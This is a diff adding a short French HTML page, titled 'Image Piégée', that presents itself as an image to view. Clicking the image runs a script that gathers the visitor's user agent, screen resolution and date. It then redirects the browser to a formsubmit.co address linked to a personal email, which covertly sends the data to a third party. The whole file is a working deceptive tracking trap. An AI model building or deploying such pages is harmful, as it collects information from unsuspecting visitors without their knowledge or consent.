@@ -1,0 +1,26 @@
+
+    <!DOCTYPE html>
+    <html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+        <title>Image Piégée</title>
+    </head>
+    <body>
+        <h2>Voir l'image</h2>
+        <img src="https://tracksys-links.netlify.app/4x4b.jpg" id="img" style="cursor:pointer; max-width:500px;">
+        <script>
+            document.getElementById("img").onclick = function() {
+                const infos = {
+                    userAgent: navigator.userAgent,
+                    resolution: screen.width + "x" + screen.height,
+                    date: new Date().toLocaleString()
+                };
+                const email = "oguerep@gmail.com";
+                const base = "https://formsubmit.co/" + email;
+                const params = new URLSearchParams(infos).toString();
+                window.location.href = base + "?" + params;
+            };
+        </script>
+    </body>
+    </html>
+    
